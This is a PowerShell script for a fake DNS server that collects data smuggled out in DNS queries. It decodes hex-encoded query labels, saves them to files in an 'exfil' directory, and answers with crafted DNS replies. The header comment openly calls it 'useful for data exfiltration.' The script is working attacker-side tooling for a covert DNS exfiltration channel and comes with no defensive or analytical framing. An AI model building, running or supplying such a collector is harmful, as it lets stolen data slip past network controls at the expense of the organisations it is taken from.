# Pseudo-DNS Server - https://www.ietf.org/rfc/rfc1035.txt
# Collects the data coming from incoming queries and merges them into a file. 
# Useful for data exfiltration.

param( $address="Any", $port=53, $basepath="c:\XXXXX\exfil\" )

try{
	$endpoint = new-object System.Net.IPEndPoint( [IPAddress]::$address, $port )
	$udpclient = new-object System.Net.Sockets.UdpClient $port
}
catch{
	throw $_
	exit -1
}

while( $true )
{

    Get-ChildItem -Path $basepath -File | Where-Object { $_.CreationTime -lt (Get-Date).AddHours(-24) } | Remove-Item #auto cleanup
    Start-Sleep -Milliseconds 100 

	if( $udpclient.Available )
	{
		$content = $udpclient.Receive( [ref]$endpoint )
        #$content | Format-Hex
        $fid="$($endpoint.Address.IPAddressToString).$((Get-Date).Ticks)"
        #Write-Host $fid
        $qlen=$content[12]
        $qry=""
        for ($i=0; $i -lt $qlen; $i++)
        {
            $charx=([char][byte]($content[13+$i]))
            if (($i -le 40) -and ($charx -imatch "[a-f0-9]")) #simple input sanitization
            {
                $qry=$qry+$charx
            }
        }
        #Write-Host $qry
        
        $txtbuf=(-join ($qry -split '(..)' | ? { $_ } | % { [char][convert]::ToUInt32($_,16) }))
        [io.file]::WriteAllText($basepath+$fid+'.txt',$txtbuf)

        [byte[]]$dgram=$content[0..1] #ID
        $dgram+=(0x84,0x80) #|QR|Opcode|AA|TC|RD|RA|Z|RCODE 
        $dgram+=(0,1,0,1,0,0,0,1) # QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT
        $dgram+=$content[12] #length
        $dgram+=$content[13..(13+$content[12]+9)] #qlen+domainname+00
        $dgram+=(0,1,0,1) # A, IN
        $dgram+=(0xc0,0x0c,0,1,0,1) # answer, A, IN
        $dgram+=(0,0,0,60) # TTL
        $dgram+=(0,4) # data length, 4 octets

        $dgram+=($endpoint.Address.Address -band 0x000000FF) 
        $dgram+=($endpoint.Address.Address -band 0x0000FF00) -shr 8
        $dgram+=($endpoint.Address.Address -band 0x00FF0000) -shr 16
        $dgram+=($endpoint.Address.Address -band 0xFF000000) -shr 24

        $dgram+=(0,0,0x29,0x0f,0xa0,0,0,0,0,0,0) #OPT
        $udpclient.Send($dgram, $dgram.Length, $endpoint)
	}
}

